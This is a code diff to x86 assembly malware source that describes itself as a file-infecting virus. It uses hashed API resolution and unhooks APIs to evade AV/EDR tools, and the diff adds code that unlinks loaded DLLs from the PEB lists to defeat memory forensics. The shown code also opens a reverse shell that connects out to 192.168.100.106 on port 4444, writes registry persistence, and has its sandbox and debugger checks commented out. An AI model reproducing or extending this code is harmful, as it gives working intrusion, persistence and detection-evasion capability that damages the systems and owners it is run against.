@@ -10,8 +10,9 @@
 ;	[+] Infect all 32 bit exe files in the directory, infected files can do the same while continuing to function normally
 ;	[+] Unhooking API to bypass AVs/EDRs
 ;	[+] Hide API through hashing
+;	[+] Unlinkling malicious Dll for anti-memory forensic
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1299 bytes
+; Size: 1380 bytes
 ;-------------------------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -39,35 +40,51 @@ next:
 	Jmp check
 
 hash_api:
-	Pushad						; save all registers
+	Pushad							; save all registers
 	Mov Ebp, Esp
-	Xor Esi, Esi
-	Mov Edx, [Fs:30H + Esi]				; PEB
-	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
-	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
+	Pushfd
+	Pop Eax
+	Mov [Ebp - 300H], Eax
+	Xor Edi, Edi
+	Mov Edx, [Fs:30H + Edi]			; PEB
+	Mov Edx, [Edx + 0CH]			; PEB_LDR_DATA
+	Mov Edx, [Edx + 14H]			; First module in InMemoryOrderModuleList
+	Mov Edi, Edx					; Save the first position in the list
 
-next_module:
-	Mov Esi, [Edx + 28H]				; Move pointer to module's name
-	Movzx Ecx, Word Ptr [Edx + 26H]			; Set counter = length of the module name
+find_next_unlink_dll:
+	Mov Edx, [Edx]					; get next module
+	Cmp Edx, Edi					; Check if we loop back to start
+	Je exit_fail
+
+next_module_info:
+	Mov Esi, [Edx + 28H]			; Move pointer to BaseDllName.Buffer
+	Movzx Ecx, Word Ptr [Edx + 26H]	; Set counter = BaseDllName.Length
 	Xor Edi, Edi
 
 calculate_hash:
 	Xor Eax, Eax
-	Lodsb						; Load the name of the module to eax
-	Cmp Al, 61H					; Check for the lowercase ('a' is 0x61 in hex)
+	Lodsb							; Load the name of the module to eax
+	Cmp Al, 61H						; Check for the lowercase ('a' is 0x61 in hex)
 	Jl uppercase					; Jump if uppercase
-	Sub Al, 20H					; convert to uppercase
+	Sub Al, 20H						; convert to uppercase
 
 uppercase:
 	Ror Edi, 0DH					; Rotate right by 13 bits
 	Add Edi, Eax					; Add the next byte of the name
 	Dec Ecx
 	Jnz calculate_hash
-	Push Edx					; Push the current module to the stack for later use
-	Push Edi					; The hash value is stored in edi
 
+	Mov Eax, [Ebp - 300H]			; Move the EFLAGS to eax
+	And Eax, 1						; now eax = 1 if the CF is set, 0 if not
+	Cmp Al, 1
+	; Check if the flag stores in CF (Carry Flag) is 1 or not, if equal => unlink dll, else resolve api
+	Je unlink_module				; If CF = 1 then jump
+	Push Edx						; Push the current module to the stack for later use
+	Push Edi						; The hash value is stored in edi
+
+api_resolution:
 	; Iterate through the export address table
-	Mov Edx, [Edx + 10H]				; Base address of the current module
+	Mov Edx, [Edx + 10H]			; Base address of the current module
 	Mov Eax, [Edx + 3CH]
 	Add Eax, Edx					; PE signature
 
@@ -76,10 +93,10 @@ uppercase:
 	Jz get_next_module				; If no, then proceed to the next module
 
 	Add Eax, Edx					; Address of Export Table
-	Push Eax					; Save the address of Export Table for later use
+	Push Eax						; Save the address of Export Table for later use
 
-	Mov Ecx, [Eax + 18H]				; Set counter = number of exported function names
-	Mov Ebx, [Eax + 20H]				; Get address of name table
+	Mov Ecx, [Eax + 18H]			; Set counter = number of exported function names
+	Mov Ebx, [Eax + 20H]			; Get address of name table
 	Add Ebx, Edx					; ebx = Address of name table
 
 	; Hash module and function name
@@ -88,48 +105,49 @@ get_next_function:
 	Test Ecx, Ecx
 	Jz jump_next_module				; If no exported function left => jump to next module
 	Dec Ecx
-	Mov Esi, [Ebx + Ecx * 4]			; RVA of next function name
+	Mov Esi, [Ebx + Ecx * 4]		; RVA of next function name
 	Add Esi, Edx
 	Xor Edi, Edi
 
 loop_funcname:
 	Xor Eax, Eax
-	Lodsb						; Load the name of the function to eax
+	Lodsb							; Load the name of the function to eax
 	Ror Edi, 0DH					; Rotate right by 13 bits
 	Add Edi, Eax					; Add the next byte of the name
-	Cmp Al, Ah					; Compare Al (next byte from the name) with the AH (null terminator)
+	Cmp Al, Ah						; Compare Al (next byte from the name) with the AH (null terminator)
 	Jne loop_funcname
 	Add Edi, [Ebp - 8H]				; Add the module hash with function hash
-	Cmp Edi, [Ebp + 24H]				; Compare it with the hash that we are searching for
-	Jnz get_next_function				; Move on and hash the next function if the hash is not identical
+	Cmp Edi, [Ebp + 24H]			; Compare it with the hash that we are searching for
+	Jnz get_next_function			; Move on and hash the next function if the hash is not identical
 
-	; If the desired hased function is found then get its address
-	Pop Eax						; Restore the address of Export Table
-	Mov Ebx, [Eax + 24H]				; Get the RVA of the ordinal table
+	; If the desired hashed function is found then get its address
+	Clc								; Clear the flag stores in CF (just in case)
+	Pop Eax							; Restore the address of Export Table
+	Mov Ebx, [Eax + 24H]			; Get the RVA of the ordinal table
 	Add Ebx, Edx
-	Mov Cx, [Ebx + 2 * Ecx]				; Get the function ordinal
+	Mov Cx, [Ebx + 2 * Ecx]			; Get the function ordinal
 	Mov Ebx, [Eax + 1CH]
 	Add Ebx, Edx					; Get the address of the address function table
 	Mov Eax, [Ebx + 4 * Ecx]
 	Add Eax, Edx					; This is the address of the function that we are looking for
-	Mov [Esp + 24H], Eax				; Save the address
+	Mov [Esp + 24H], Eax			; Save the address
 
 	; Fix up the stack and jump to the desired function
-	Pop Ebx						; Clear the current modules hash
-	Pop Ebx						; Clear the current position in the module list
+	Pop Ebx							; Clear the current modules hash
+	Pop Ebx							; Clear the current position in the module list
 	Popad
-	Pop Ecx
-	Pop Edx
-	Push Ecx
-	Mov Edx, [Ebp - 20H]				; Check the unhook required flag
-	Cmp Dl, 1					; If the flag is true
+	Pop Ecx							; pop off the original return address
+	Pop Edx							; pop off the hash value that the caller have pushed
+	Push Ecx						; push back the return address
+	Mov Edx, [Ebp - 20H]			; Check the unhook required flag
+	Cmp Dl, 1						; If the flag is true
 	Je hooked_func_addr				; Then jump to this to get the address of the desired function only
-	Jmp Eax						; If not then execute function
+	Jmp Eax							; If not then execute function
 
 hooked_func_addr:
 	Xor Edx, Edx
-	Mov [Ebp - 20H], Edx				; Clear the flag
-	Ret						; Return to the original execution flow
+	Mov [Ebp - 20H], Edx		; Clear the flag
+	Ret							; Return to the original execution flow
 
 ; If the current module is not the desired one then jump here
 jump_next_module:
@@ -139,12 +157,44 @@ get_next_module:
 	Pop Edi						; Pop off the current module hash
 	Pop Edx						; Restore the current position in the module list
 	Mov Edx, [Edx]					; Go to the next module
-	Jmp next_module
+	Jmp next_module_info
+
+unlink_module:
+	; Compare hashes
+	Cmp Edi, [Ebp + 24H]		  ; Compare with the hash we are searching for
+	Jne find_next_unlink_dll
+
+    ; Unlink from all three lists
+    Mov Eax, [Edx - 8H]           ; InLoadOrderLinks.Flink
+    Mov Ebx, [Edx - 4H]           ; InLoadOrderLinks.Blink
+    mov [ebx], eax
+    Mov [Eax + 4H], Ebx
+
+    Mov Eax, [Edx]            	  ; InMemoryOrderLinks.Flink
+    Mov Ebx, [Edx + 4H]           ; InMemoryOrderLinks.Blink
+    mov [ebx], eax
+    Mov [Eax + 4H], Ebx
+
+    Mov Eax, [Edx - 8H + 10H]     ; InInitializationOrderLinks.Flink
+    Mov Ebx, [Edx - 8H + 14H]     ; InInitializationOrderLinks.Blink
+    mov [ebx], eax
+    Mov [Eax + 4H], Ebx
+
+    Clc								; Clear the flag
+    Popad							; restore all register
+	Pop Ecx							; pop off the original return address
+	Pop Edx							; pop off the hash value that the caller have pushed
+	Push Ecx						; push back the return address
+    Ret
 
 exit:
 	Push Ebx					; 0
 	Push 56A2B5F0H					; hash("kernel32.dll", "ExitProcess")
 	Call hash_api
+
+exit_fail:
+	Popad
+	Ret
 
 exit_success:
 	Xor Esi, Esi
@@ -165,14 +215,14 @@ check:
 	Push 4B2B9D76H					; hash("kernel32.dll", "GetSystemInfo")
 	Call hash_api
 
-	Mov Eax, [Ebp - 250H + 14H]
-	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
-	Jl exit_success					; exit
-
-	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
-	Call hash_api
-	Test Al, Al					; Check if the flag is true or not
-	Jnz exit_success
+;	Mov Eax, [Ebp - 250H + 14H]
+;	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
+;	Jl exit_success					; exit
+;
+;	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
+;	Call hash_api
+;	Test Al, Al					; Check if the flag is true or not
+;	Jnz exit_success
 
 unhook_api:
 	; For demo, only CreateProcessA will get unhooked only
@@ -183,6 +233,7 @@ unhook_api:
 
 	Mov Al, 1
 	Mov [Ebp - 20H], Al				; Set flag for the function that needs to be unhooked
+	Clc
 	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
 	Call hash_api
 
@@ -239,13 +290,18 @@ reverse_shell:
 	; connect(SOCKET s, const addr *name, int namelen)
 	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
 	; listen on all interfaces
-	Push 0DE64A8C0H 					; 192.168.100.222
+	Push 6A64A8C0H 					; 192.168.100.106
 	Mov Eax, 5C110102H
 	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
 	Push Eax					; namelen 
 	Push Esp					; *name: 5C110002
 	Push Edi					; Arg 1(s): WSASocketA() Handler
 	Push 6174A599H					; hash("ws2_32.dll", "connect")
+	Call hash_api
+
+	; Unlink ws2_32.dll
+	Stc							; Set the flag to unlink the dll
+	Push 9211A042H				; Hash ws2_32.dll
 	Call hash_api
 
 	; CreateProcessA
@@ -282,6 +338,7 @@ zero_mem_struct:
 	Push Eax					; lpApplicationName
 	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
 	Call hash_api					; CreateProcessA
+
 
 	; Calling WaitForSingleObject
 	Xor Edx, Edx
@@ -367,6 +424,12 @@ SetRegistryKey:
 	Push Edi
 	Push 81C2AC44H
 	Call hash_api					; Call RegCloseKey
+
+	; Unlink advapi32.dll
+	Stc							; Set flag for unlinking dll
+	Push 0E290FD31H
+	Call hash_api
+
 	Lea Edi, [Ebp - 150H]
 
 ; Copy the path from [ebp - 200H] to [ebp - 150H]
